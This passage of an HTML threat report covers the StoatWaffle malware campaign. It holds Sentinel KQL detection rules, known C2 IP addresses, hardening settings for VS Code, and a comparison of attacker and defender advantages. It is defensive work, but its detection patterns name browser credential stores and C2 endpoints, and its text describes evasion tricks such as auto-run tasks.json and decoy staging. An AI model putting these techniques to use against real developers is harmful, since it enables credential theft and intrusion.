+      <tr><td><span class="mitre-id">T1071.001</span></td><td>C2: Web Protocol</td><td>HTTP polling /api/errorMessage every 5s</td><td><span class="sev high">High</span></td></tr>
+      <tr><td><span class="mitre-id">T1555.003</span></td><td>Credentials from Web Browsers</td><td>Chrome Login Data, Firefox key4.db</td><td><span class="sev high">High</span></td></tr>
+      <tr><td><span class="mitre-id">T1539</span></td><td>Steal Web Session Cookie</td><td>Browser extension data exfil</td><td><span class="sev high">High</span></td></tr>
+      <tr><td><span class="mitre-id">T1555.001</span></td><td>Keychain (macOS)</td><td>login.keychain-db exfiltration</td><td><span class="sev high">High</span></td></tr>
+      <tr><td><span class="mitre-id">T1202</span></td><td>Indirect Command Execution</td><td>wslpath via Node.js in WSL</td><td><span class="sev medium">Medium</span></td></tr>
+      <tr><td><span class="mitre-id">T1195.001</span></td><td>Supply Chain: Dev Tools</td><td>Malicious repo + tasks.json</td><td><span class="sev critical">Critical</span></td></tr>
+      <tr><td><span class="mitre-id">T1027</span></td><td>Obfuscated Files</td><td>Staging URLs return decoy w/o correct headers</td><td><span class="sev medium">Medium</span></td></tr>
+    </tbody>
+  </table>
+</section>
+
+<hr class="sep">
+
+<!-- §6 -->
+<section class="section" id="s6">
+  <div class="section-header">
+    <span class="section-num">06</span>
+    <h2 class="section-title">Microsoft Sentinel — Detection Rules</h2>
+    <div class="section-line"></div>
+  </div>
+  <div class="callout info">
+    <div class="callout-lbl">ℹ Prerequisites</div>
+    <p>Requires: <strong>Microsoft Defender for Endpoint</strong> tables (<code>DeviceProcessEvents</code>, <code>DeviceNetworkEvents</code>, <code>DeviceFileEvents</code>) connected to Sentinel, and Security Events with Event ID 4688 command-line auditing enabled.</p>
+  </div>
+
+  <h3>Rule 1 — VS Code Spawning Node.js</h3>
+  <div class="code-block">
+    <div class="code-label kql">KQL · Scheduled Rule · Severity: High</div>
+    <pre><span class="cm">// node.exe spawned by Code.exe — StoatWaffle Step 3 signature</span>
+<span class="var">DeviceProcessEvents</span>
+<span class="op">|</span> <span class="kw">where</span> TimeGenerated > <span class="fn">ago</span>(<span class="num">1d</span>)
+<span class="op">|</span> <span class="kw">where</span> InitiatingProcessFileName <span class="op">=~</span> <span class="str">"Code.exe"</span>
+    <span class="kw">and</span> FileName <span class="op">=~</span> <span class="str">"node.exe"</span>
+<span class="op">|</span> <span class="kw">where</span> ProcessCommandLine <span class="fn">has_any</span>(<span class="str">"env.npl"</span>, <span class="str">"vscode-bootstrap"</span>,
+    <span class="str">"errorMessage"</span>, <span class="str">"handleErrors"</span>)
+<span class="op">|</span> <span class="kw">project</span> TimeGenerated, DeviceName, AccountName,
+    InitiatingProcessFileName, FileName, ProcessCommandLine
+<span class="op">|</span> <span class="kw">extend</span> RiskScore = <span class="num">80</span>,
+    Technique = <span class="str">"T1204.002 - User Execution: Malicious File"</span></pre>
+  </div>
+
+  <h3>Rule 2 — C2 Beaconing (5-second interval)</h3>
+  <div class="code-block">
+    <div class="code-label kql">KQL · Scheduled Rule · Severity: Critical</div>
+    <pre><span class="cm">// Detects StoatWaffle's characteristic 5s C2 polling from node.exe</span>
+<span class="var">DeviceNetworkEvents</span>
+<span class="op">|</span> <span class="kw">where</span> TimeGenerated > <span class="fn">ago</span>(<span class="num">1d</span>)
+<span class="op">|</span> <span class="kw">where</span> InitiatingProcessFileName <span class="op">=~</span> <span class="str">"node.exe"</span>
+<span class="op">|</span> <span class="kw">where</span> RemoteUrl <span class="fn">has_any</span>(<span class="str">"/api/errorMessage"</span>, <span class="str">"/api/handleErrors"</span>,
+    <span class="str">"/api/hsocketNext"</span>, <span class="str">"/api/hsocketResult"</span>,
+    <span class="str">"/upload"</span>, <span class="str">"/uploadsecond"</span>)
+<span class="op">|</span> <span class="kw">summarize</span> CallCount = <span class="fn">count</span>(),
+    FirstSeen = <span class="fn">min</span>(TimeGenerated), LastSeen = <span class="fn">max</span>(TimeGenerated)
+    <span class="kw">by</span> DeviceName, RemoteIP, RemoteUrl, InitiatingProcessFileName
+<span class="op">|</span> <span class="kw">where</span> CallCount > <span class="num">10</span>
+<span class="op">|</span> <span class="kw">extend</span> IntervalSeconds =
+    <span class="fn">datetime_diff</span>(<span class="str">'second'</span>, LastSeen, FirstSeen) / <span class="fn">toreal</span>(CallCount)
+<span class="op">|</span> <span class="kw">where</span> IntervalSeconds <span class="fn">between</span> (<span class="num">3</span> .. <span class="num">8</span>)   <span class="cm">// ~5s window</span>
+<span class="op">|</span> <span class="kw">extend</span> RiskScore = <span class="num">95</span>,
+    Technique = <span class="str">"T1071.001 - C2 Application Layer Protocol"</span></pre>
+  </div>
+
+  <h3>Rule 3 — Known C2 IOC Match</h3>
+  <div class="code-block">
+    <div class="code-label kql">KQL · IOC Match · Severity: High</div>
+    <pre><span class="kw">let</span> <span class="var">StoatWaffleC2</span> = <span class="fn">dynamic</span>([
+    <span class="str">"185.163.125.196"</span>, <span class="str">"147.124.202.208"</span>,
+    <span class="str">"163.245.194.216"</span>, <span class="str">"66.235.168.136"</span>, <span class="str">"87.236.177.9"</span>
+]);
+<span class="fn">union</span> DeviceNetworkEvents, CommonSecurityLog
+<span class="op">|</span> <span class="kw">where</span> DestinationIP <span class="fn">in</span> (<span class="var">StoatWaffleC2</span>)
+    <span class="kw">or</span> SourceIP <span class="fn">in</span> (<span class="var">StoatWaffleC2</span>)
+    <span class="kw">or</span> RemoteIP <span class="fn">in</span> (<span class="var">StoatWaffleC2</span>)
+<span class="op">|</span> <span class="kw">extend</span> ThreatFamily = <span class="str">"StoatWaffle"</span>,
+    ThreatActor = <span class="str">"WaterPlum / DPRK"</span>,
+    Technique = <span class="str">"T1071.001"</span>
+<span class="op">|</span> <span class="kw">project</span> TimeGenerated, DeviceName, SourceIP,
+    DestinationIP, RemotePort, InitiatingProcessFileName,
+    ThreatFamily, ThreatActor</pre>
+  </div>
+
+  <h3>Rule 4 — Browser Credential DB Access by Node.js</h3>
+  <div class="code-block">
+    <div class="code-label kql">KQL · Scheduled Rule · Severity: Critical</div>
+    <pre><span class="cm">// StoatWaffle Stealer — browser credential store access</span>
+<span class="var">DeviceFileEvents</span>
+<span class="op">|</span> <span class="kw">where</span> TimeGenerated > <span class="fn">ago</span>(<span class="num">1d</span>)
+<span class="op">|</span> <span class="kw">where</span> InitiatingProcessFileName <span class="op">=~</span> <span class="str">"node.exe"</span>
+<span class="op">|</span> <span class="kw">where</span> FolderPath <span class="fn">has_any</span>(
+    <span class="str">"\\Google\\Chrome\\User Data\\Default\\Login Data"</span>,
+    <span class="str">"\\Microsoft\\Edge\\User Data\\Default\\Login Data"</span>,
+    <span class="str">"\\Mozilla\\Firefox\\Profiles"</span>,
+    <span class="str">"key4.db"</span>, <span class="str">"logins.json"</span>,
+    <span class="str">"extensions.json"</span>, <span class="str">"Local Extension Settings"</span>
+  )
+<span class="op">|</span> <span class="kw">project</span> TimeGenerated, DeviceName,
+    InitiatingProcessAccountName, FolderPath, FileName, ActionType
+<span class="op">|</span> <span class="kw">extend</span> RiskScore = <span class="num">90</span>,
+    Technique = <span class="str">"T1555.003 - Credentials from Web Browsers"</span></pre>
+  </div>
+
+  <h3>Rule 5 — WSL Path Conversion Abuse</h3>
+  <div class="code-block">
+    <div class="code-label kql">KQL · Scheduled Rule · Severity: High</div>
+    <pre><span class="cm">// node.exe invoking wslpath — WSL boundary-crossing pivot</span>
+<span class="var">DeviceProcessEvents</span>
+<span class="op">|</span> <span class="kw">where</span> TimeGenerated > <span class="fn">ago</span>(<span class="num">1d</span>)
+<span class="op">|</span> <span class="kw">where</span> InitiatingProcessFileName <span class="op">=~</span> <span class="str">"node.exe"</span>
+<span class="op">|</span> <span class="kw">where</span> FileName <span class="op">=~</span> <span class="str">"wslpath"</span>
+    <span class="kw">or</span> (FileName <span class="op">=~</span> <span class="str">"wsl.exe"</span> <span class="kw">and</span> ProcessCommandLine <span class="fn">has</span> <span class="str">"wslpath"</span>)
+<span class="op">|</span> <span class="kw">extend</span> RiskScore = <span class="num">85</span>,
+    Technique = <span class="str">"T1202 - Indirect Command Execution"</span></pre>
+  </div>
+
+  <h3>Rule 6 — Vercel Payload Staging</h3>
+  <div class="code-block">
+    <div class="code-label kql">KQL · Hunting Query · Severity: Medium</div>
+    <pre><span class="cm">// High-frequency Vercel calls from dev tooling — staging pattern</span>
+<span class="var">DeviceNetworkEvents</span>
+<span class="op">|</span> <span class="kw">where</span> RemoteUrl <span class="fn">has</span> <span class="str">"vercel.app"</span>
+<span class="op">|</span> <span class="kw">where</span> InitiatingProcessFileName <span class="fn">has_any</span>(
+    <span class="str">"node.exe"</span>, <span class="str">"cmd.exe"</span>, <span class="str">"Code.exe"</span>)
+<span class="op">|</span> <span class="kw">summarize</span> <span class="fn">count</span>() <span class="kw">by</span> DeviceName, RemoteUrl,
+    InitiatingProcessFileName, <span class="fn">bin</span>(TimeGenerated, <span class="num">1h</span>)
+<span class="op">|</span> <span class="kw">where</span> count_ > <span class="num">5</span></pre>
+  </div>
+
+  <h3>&#11088; Composite Rule — Multi-Signal High-Fidelity</h3>
+  <div class="callout ok">
+    <div class="callout-lbl">&#10003; Recommended — Highest Signal-to-Noise</div>
+    <p>Correlates three independent signals on the same device within 1 hour. Very low false-positive rate. Deploy as a Scheduled Analytic Rule with <strong>Critical</strong> severity + automated SOAR playbook.</p>
+  </div>
+  <div class="code-block">
+    <div class="code-label kql">KQL · Composite Rule · Severity: Critical</div>
+    <pre><span class="cm">// Multi-signal: VSCode spawn + credential access + C2 beacon (same device, 1h)</span>
+<span class="kw">let</span> <span class="var">vscode_spawn</span> = <span class="var">DeviceProcessEvents</span>
+    <span class="op">|</span> <span class="kw">where</span> TimeGenerated > <span class="fn">ago</span>(<span class="num">24h</span>)
+    <span class="op">|</span> <span class="kw">where</span> InitiatingProcessFileName <span class="op">=~</span> <span class="str">"Code.exe"</span>
+        <span class="kw">and</span> FileName <span class="op">=~</span> <span class="str">"node.exe"</span>
+    <span class="op">|</span> <span class="kw">project</span> DeviceName, T_spawn = TimeGenerated;
+
+<span class="kw">let</span> <span class="var">cred_access</span> = <span class="var">DeviceFileEvents</span>
+    <span class="op">|</span> <span class="kw">where</span> TimeGenerated > <span class="fn">ago</span>(<span class="num">24h</span>)
+    <span class="op">|</span> <span class="kw">where</span> InitiatingProcessFileName <span class="op">=~</span> <span class="str">"node.exe"</span>
+    <span class="op">|</span> <span class="kw">where</span> FolderPath <span class="fn">has_any</span>(<span class="str">"Login Data"</span>, <span class="str">"key4.db"</span>,
+        <span class="str">"extensions.json"</span>, <span class="str">"Local Extension Settings"</span>)
+    <span class="op">|</span> <span class="kw">project</span> DeviceName, T_cred = TimeGenerated;
+
+<span class="kw">let</span> <span class="var">c2_beacon</span> = <span class="var">DeviceNetworkEvents</span>
+    <span class="op">|</span> <span class="kw">where</span> TimeGenerated > <span class="fn">ago</span>(<span class="num">24h</span>)
+    <span class="op">|</span> <span class="kw">where</span> InitiatingProcessFileName <span class="op">=~</span> <span class="str">"node.exe"</span>
+    <span class="op">|</span> <span class="kw">where</span> RemoteUrl <span class="fn">has_any</span>(<span class="str">"/api/errorMessage"</span>,
+        <span class="str">"/api/hsocketNext"</span>, <span class="str">"/upload"</span>)
+    <span class="op">|</span> <span class="kw">project</span> DeviceName, T_c2 = TimeGenerated;
+
+<span class="var">vscode_spawn</span>
+<span class="op">|</span> <span class="kw">join kind</span>=<span class="fn">inner</span> <span class="var">cred_access</span> <span class="kw">on</span> DeviceName
+<span class="op">|</span> <span class="kw">join kind</span>=<span class="fn">inner</span> <span class="var">c2_beacon</span>   <span class="kw">on</span> DeviceName
+<span class="op">|</span> <span class="kw">where</span> <span class="fn">abs</span>(<span class="fn">datetime_diff</span>(<span class="str">'minute'</span>, T_spawn, T_cred)) < <span class="num">60</span>
+    <span class="kw">and</span> <span class="fn">abs</span>(<span class="fn">datetime_diff</span>(<span class="str">'minute'</span>, T_spawn, T_c2))  < <span class="num">60</span>
+<span class="op">|</span> <span class="kw">distinct</span> DeviceName, T_spawn, T_cred, T_c2
+<span class="op">|</span> <span class="kw">extend</span> AlertName  = <span class="str">"StoatWaffle — Composite Detection"</span>,
+    Severity   = <span class="str">"Critical"</span>,
+    Tactics    = <span class="str">"Execution | Credential Access | C2"</span>,
+    Techniques = <span class="str">"T1204.002 | T1555.003 | T1071.001"</span></pre>
+  </div>
+</section>
+
+<hr class="sep">
+
+<!-- §7 -->
+<section class="section" id="s7">
+  <div class="section-header">
+    <span class="section-num">07</span>
+    <h2 class="section-title">Attacker vs. Defender</h2>
+    <div class="section-line"></div>
+  </div>
+  <div class="atkdef">
+    <div class="atkdef-panel atk">
+      <div class="atkdef-title">&#128308; Attacker Advantages</div>
+      <div class="atkdef-item"><div class="atkdef-icon">&#9658;</div><div><strong>Zero interaction after trust</strong><p>Full chain fires with zero additional developer input after the workspace trust dialog.</p></div></div>
+      <div class="atkdef-item"><div class="atkdef-icon">&#9658;</div><div><strong>Legitimate tooling abuse</strong><p>Node.js from official site, tasks.json is a standard feature — minimal heuristic signal.</p></div></div>
+      <div class="atkdef-item"><div class="atkdef-icon">&#9658;</div><div><strong>In-process eval</strong><p>RAT eval command runs in-process — no child spawn, no EDR process tree alert.</p></div></div>
+      <div class="atkdef-item"><div class="atkdef-icon">&#9658;</div><div><strong>WSL boundary bypass</strong><p>Crosses Windows/Linux security boundary — invisible to many DLP and EDR rules.</p></div></div>
+      <div class="atkdef-item"><div class="atkdef-icon">&#9658;</div><div><strong>Decoy staging</strong><p>Staging URLs return innocuous content unless correct headers — defeats automated scanners.</p></div></div>
+    </div>
+    <div class="atkdef-panel def">
+      <div class="atkdef-title">&#128994; Defender Opportunities</div>
+      <div class="atkdef-item"><div class="atkdef-icon">&#9658;</div><div><strong>Code.exe → node.exe</strong><p>Unusual parent-child relationship. Easily detectable in MDE process telemetry.</p></div></div>
+      <div class="atkdef-item"><div class="atkdef-icon">&#9658;</div><div><strong>5s polling pattern</strong><p>Statistical beaconing detection on /api/errorMessage and /api/hsocketNext.</p></div></div>
+      <div class="atkdef-item"><div class="atkdef-icon">&#9658;</div><div><strong>Published IOCs</strong><p>5 C2 IPs ready to block at firewall, Zscaler ZIA, and Sentinel watchlist immediately.</p></div></div>
+      <div class="atkdef-item"><div class="atkdef-icon">&#9658;</div><div><strong>node.exe + Login Data</strong><p>node.exe accessing browser credential stores = near-zero false positive rate.</p></div></div>
+      <div class="atkdef-item"><div class="atkdef-icon">&#9658;</div><div><strong>Policy enforcement</strong><p>task.allowAutomaticTasks: "off" eliminates the runOn:folderOpen trigger entirely.</p></div></div>
+    </div>
+  </div>
+</section>
+
+<hr class="sep">
+
+<!-- §8 -->
+<section class="section" id="s8">
+  <div class="section-header">
+    <span class="section-num">08</span>
+    <h2 class="section-title">Hardening Checklist</h2>
+    <div class="section-line"></div>
+  </div>
+  <div class="priority-grid">
+    <div class="prio-card p1"><div class="prio-num">P1 · Immediate</div><div class="prio-title">Block C2 IPs</div><p>Add 5 IOCs to firewall, ZIA policy, and Sentinel watchlist now.</p></div>
+    <div class="prio-card p1"><div class="prio-num">P1 · Immediate</div><div class="prio-title">Deploy Sentinel Rules</div><p>Activate composite rule + C2 IOC match. Enable SOAR auto-response.</p></div>
+    <div class="prio-card p2"><div class="prio-num">P2 · Short-term</div><div class="prio-title">Disable Auto Tasks</div><p>Set <code>task.allowAutomaticTasks: "off"</code> via Intune/GPO fleet-wide.</p></div>
+    <div class="prio-card p2"><div class="prio-num">P2 · Short-term</div><div class="prio-title">VS Code Trust Policy</div><p>Enforce Workspace Trust Restricted Mode. Set untrustedFiles to "prompt".</p></div>
+    <div class="prio-card p3"><div class="prio-num">P3 · Medium-term</div><div class="prio-title">Developer Training</div><p>Educate on blockchain repo lures, recruiter impersonation, and IDE task risks.</p></div>
+    <div class="prio-card p4"><div class="prio-num">P4 · Ongoing</div><div class="prio-title">Expand Dev Coverage</div><p>Extend detection to npm install anomalies, Git clone telemetry, WSL events.</p></div>
+  </div>
+  <h3>VS Code Hardening via Intune</h3>
+  <div class="code-block">
+    <div class="code-label json">JSON · VS Code settings.json — enforce via Intune Custom Profile</div>
+    <pre>{
+  <span class="str">"security.workspace.trust.enabled"</span>: <span class="kw">true</span>,
+  <span class="str">"security.workspace.trust.untrustedFiles"</span>: <span class="str">"prompt"</span>,
+  <span class="str">"security.workspace.trust.banner"</span>: <span class="str">"always"</span>,
+  <span class="str">"security.workspace.trust.emptyWindow"</span>: <span class="kw">false</span>,
+  <span class="str">"task.allowAutomaticTasks"</span>: <span class="str">"off"</span>    <span class="cm">// Direct mitigation: disables runOn:folderOpen</span>
+}</pre>
+  </div>
+  <table class="check-table">
+    <thead><tr><th>Control</th><th>Action</th><th>Coverage</th><th>Priority</th></tr></thead>
+    <tbody>
+      <tr><td>task.allowAutomaticTasks</td><td>Set to <code>"off"</code> via Intune</td><td>Eliminates zero-click trigger</td><td><span class="sev critical">P1</span></td></tr>
+      <tr><td>Workspace Trust enforcement</td><td>Banner + prompt for untrusted files</td><td>Adds friction before trust grant</td><td><span class="sev critical">P1</span></td></tr>
+      <tr><td>C2 IP block (firewall + ZIA)</td><td>Block 5 published IOCs</td><td>Breaks C2 channel post-infection</td><td><span class="sev critical">P1</span></td></tr>
+      <tr><td>Sentinel composite rule</td><td>Deploy multi-signal KQL rule</td><td>Detects active compromise</td><td><span class="sev critical">P1</span></td></tr>
+      <tr><td>MDE ASR rules</td><td>Block script content downloaded from internet</td><td>Blocks vscode-bootstrap.cmd payload</td><td><span class="sev high">P2</span></td></tr>
+      <tr><td>npm audit policy</td><td>Mandate npm audit + registry restrictions</td><td>Reduces npm attack surface</td><td><span class="sev high">P2</span></td></tr>
+      <tr><td>WSL telemetry</td><td>Enable WSL process events in MDE</td><td>Detects cross-boundary pivots</td><td><span class="sev medium">P3</span></td></tr>
+      <tr><td>Security awareness</td><td>Training on blockchain lure patterns</td><td>Reduces social engineering success rate</td><td><span class="sev medium">P3</span></td></tr>
+    </tbody>
+  </table>
+</section>
+
+<hr class="sep">
+
+<!-- §9 -->
+<section class="section" id="s9">
+  <div class="section-header">
+    <span class="section-num">09</span>
+    <h2 class="section-title">Conclusion</h2>
+    <div class="section-line"></div>
+  </div>
+  <p>StoatWaffle is not an isolated malware family — it is the latest chapter in a state-sponsored, industrialised campaign that has evolved consistently since 2022, each iteration more evasive, more automated, and more deeply embedded in the developer's trusted toolchain.</p>
+  <div class="callout bad">
+    <div class="callout-lbl">&#128308; Paradigm Shift</div>
+    <p>The attack surface has moved. Monitoring production pipelines and package registries is no longer sufficient. <strong>The developer workstation and IDE are now primary attack vectors</strong> — and the trust model developers extend to their own tools is being weaponized at scale by a well-funded nation-state actor.</p>
+  </div>
+  <p>A compromised developer workstation is not a dead end. It is an entry point into cloud infrastructure, CI/CD pipelines, secrets managers, and production systems. The density of high-value credentials on a developer machine — tokens, private keys, certificates, database connections — makes it one of the most valuable initial access targets in any enterprise.</p>
+  <div class="callout purple">
+    <div class="callout-lbl">&#128995; For Enterprise Security Teams</div>
+    <p>Extend detection scope to developer environments: VS Code telemetry, Node.js process lineage, WSL boundary crossings, IDE workspace configurations. The composite Sentinel rule in §06 gives you immediate detection coverage with minimal false positives. <strong>Start there. Deploy today.</strong></p>
+  </div>
+  <p>The question is no longer <em>"will developers be targeted?"</em> — they are, at industrial scale. The question is: <strong>do you have the visibility to know when it happens?</strong></p>
+</section>
+
+</main>
+</div>
+
+<!-- FOOTER -->
+<footer>
+  <div class="footer-l">
+    StoatWaffle Threat Analysis · March 2026<br>
+    Source: <a href="https://jp.security.ntt/insights_resources/tech_blog/stoatwaffle_malware_en/">NTT Security Japan</a> · Detections: Thomas (Infrastructure Architect)
+  </div>
+  <div class="footer-sources">
+    NTT Security Japan · GitLab Threat Intelligence · ESET Research<br>
+    Socket Threat Research · SANS CTI Summit 2026 · <a href="https://attack.mitre.org/groups/G1052/">MITRE ATT&amp;CK G1052</a>
+  </div>
+</footer>
+
+</body>
+</html>
